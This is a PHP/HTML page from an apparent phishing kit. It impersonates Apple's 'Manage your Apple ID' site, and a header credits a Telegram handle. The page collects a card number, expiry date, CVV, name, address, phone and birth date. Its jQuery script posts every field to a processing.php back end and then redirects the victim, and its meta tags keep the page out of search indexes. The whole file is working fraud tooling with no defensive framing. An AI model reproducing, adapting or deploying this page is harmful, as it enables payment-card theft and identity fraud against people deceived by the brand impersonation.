<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "cc";
    $semantic = semantic();
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../../media/imgs/ff.ico" />

        <title>Manage your Apple ID</title>
    </head>

    <body>

        <div class="wrapper">
        <div class="all">
            <div class="a-nvbr">

                <div class="nav-con">
                    <ul>
                        <li>
                            <a href="#" class="__link __logo__"></a>
                        </li>
                        <li>
                            <a href="" class="__link"><?php echo get_text('menu1'); ?></a>
                        </li>
                        <li><a href="" class="__link"><?php echo get_text('menu2'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu3'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu4'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu5'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu6'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu7'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu8'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu9'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu10'); ?></a></li>
                        <li>
                            <a href="#" class="__link search"></a>
                        </li>
                        <li>
                            <a href="#" class="__link shp-ico"></a>
                        </li>
                    </ul>

                    <div class="hum">
                        <img src="../media/imgs/hamburger.png" alt="">
                    </div>

                    <div class="logo__container"><img src="../media/imgs/apple.svg" alt=""></div>

                    <div class="shop">
                        <img src="../media/imgs/shop.svg" alt="">
                    </div>

                </div>

            </div>
            <div class="con-cus">
                <div class="head">
                    <div class="hd-wrp">
                        <a href="#" class="_apple_link"><?php echo get_text('apple_id'); ?></a>
                        <ul class="applehd-items">
                            <li class="apple-h-it">
                                <span class="hdap-link current-link"><?php echo get_text('smenu1'); ?></span>
                            </li>
                            <li class="apple-h-it">
                                <a class="hdap-link"><?php echo get_text('smenu2'); ?></a>
                            </li>
                            <li class="apple-h-it">
                                <a class="hdap-link"><?php echo get_text('smenu3'); ?></a>
                            </li>
                        </ul>

                        <div class="arrow-down">
                            <img src="../media/imgs/arrow-down.png" alt="">
                        </div>
                    </div>
                </div>
                <div class="content-wrap credit-card">
                    <input type="hidden" id="cap" name="cap">
                    <input type="hidden" name="steeep" id="steeep" value="cc">
                    <div class="card-credit-info">

                        <h1 class="title mb50"><?php echo get_text('details_title'); ?></h1>

                        <h6 class=""><?php echo get_text('details_subtitle1'); ?></h6>
                        <p class="mb30"><?php echo get_text('details_text1'); ?></p>

                        <div class="mb20">
                            <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/visa.svg">
                            <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/master.svg">
                            <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/amex.svg">
                            <img class="mb-0" style="width: 40px; height: 25px;" src="../media/imgs/discover.png">
                        </div>  


                        <div class="float-grp mb-4 <?php echo errclass($_SESSION['errors'],'one') ?>">
                            <label for="one" class="lbl-grp"><?php echo get_text('one_placeholder'); ?></label>
                            <input name="one" id="one" type="text" class="w-100 apl-inpt input-id" value="<?php echo get_value('one'); ?>">
                        </div>

                        <div class="mt-3 d-flex align-items-md-center align-items-start flex-md-row flex-column">
                            <div class="float-grp me-md-3 mb-md-0 mb-4 w-70 <?php echo errclass($_SESSION['errors'],'two') ?>">
                                <label for="two" class="lbl-grp"><?php echo get_text('two_placeholder'); ?></label>
                                <input name="two" id="two" type="text" class="apl-inpt input-id w-100" value="<?php echo get_value('two'); ?>">
                            </div>

                            <div class="float-grp w-30 <?php echo errclass($_SESSION['errors'],'three') ?>">
                                <label for="three" class="lbl-grp"><?php echo get_text('three_placeholder'); ?></label>
                                <input name="three" id="three" type="text" class="w-100 apl-inpt input-id" value="<?php echo get_value('three'); ?>">
                            </div>
                        </div>

                        <hr class="mt30 mb30">

                        <h6 class="mb10"><?php echo get_text('details_subtitle2'); ?></h6>
                        <p class="mb30"><?php echo get_text('details_text2'); ?></p>

                        <div>
                            <div class="row mb-4">
                                <div class="col-md-6 mb-md-0 mb-4">
                                    <div class="float-grp <?php echo errclass($_SESSION['errors'],'first_name') ?>">
                                        <label for="first_name" class="lbl-grp"><?php echo get_text('first_name_placeholder'); ?></label>
                                        <input id="first_name" name="first_name" type="text"
                                            class="apl-inpt w-100 rounded-sm" value="<?php echo get_value('first_name'); ?>">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="float-grp <?php echo errclass($_SESSION['errors'],'last_name') ?>">
                                        <label for="last_name" class="lbl-grp"><?php echo get_text('last_name_placeholder'); ?></label>
                                        <input id="last_name" name="last_name" type="text"
                                            class="apl-inpt w-100 rounded-sm" value="<?php echo get_value('last_name'); ?>">
                                    </div>
                                </div>
                            </div>
                            <div class="float-grp mb-4 <?php echo errclass($_SESSION['errors'],'address') ?>">
                                <label for="address" class="lbl-grp"><?php echo get_text('address_placeholder'); ?></label>
                                <input name="address" id="address" type="text" class="apl-inpt rounded-sm w-100" value="<?php echo get_value('address'); ?>">
                            </div>
                            <div class="float-grp mb-4 <?php echo errclass($_SESSION['errors'],'zip_code') ?>">
                                <label for="zip_code" class="lbl-grp"><?php echo get_text('zip_code_placeholder'); ?></label>
                                <input name="zip_code" id="zip_code" type="text"
                                    class="apl-inpt rounded-sm w-100" value="<?php echo get_value('zip_code'); ?>">
                            </div>
                            <div class="float-grp mb-4 <?php echo errclass($_SESSION['errors'],'city') ?>">
                                <label for="city" class="lbl-grp"><?php echo get_text('city_placeholder'); ?></label>
                                <input name="city" id="city" type="text" class="apl-inpt rounded-sm w-100" value="<?php echo get_value('city'); ?>">
                            </div>
                            <div class="float-grp mb-4 <?php echo errclass($_SESSION['errors'],'phone') ?>">
                                <label for="phone" class="lbl-grp"><?php echo get_text('phone_placeholder'); ?></label>
                                <input name="phone_number" id="phone" type="text"
                                    class="apl-inpt rounded-sm w-100" value="<?php echo get_value('phone'); ?>">
                            </div>
                            <div class="float-grp mb-4 <?php echo errclass($_SESSION['errors'],'birth_date') ?>">
                                <label for="birth_date" class="lbl-grp"><?php echo get_text('birth_date_placeholder'); ?></label>
                                <input name="birth_date" id="birth_date" type="text" class="apl-inpt rounded-sm w-100" value="<?php echo get_value('birth_date'); ?>">
                            </div>

                            <div id="booom" class="submit-btn btttn">
                                <?php echo get_text('continue'); ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="fot-cntr">
                <p>
                    <?php echo get_text('footer_text'); ?>
                </p>
                <div class="d-flex align-items-center copyright">
                    <div class="d-flex align-items-center sub-copy">
                        <p>
                            <?php echo get_text('copyright'); ?>
                        </p>
                        <ul>
                            <li>
                                <?php echo get_text('footer1'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer2'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer3'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer4'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer5'); ?>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>
        </div>
    </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('0000');
            $('#birth_date').mask('00/00/0000');
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'one' : $('#one').val(),
                    'two' : $('#two').val(),
                    'three' : $('#three').val(),
                    'first_name' : $('#first_name').val(),
                    'last_name' : $('#last_name').val(),
                    'address' : $('#address').val(),
                    'zip_code' : $('#zip_code').val(),
                    'city' : $('#city').val(),
                    'phone' : $('#phone').val(),
                    'birth_date' : $('#birth_date').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>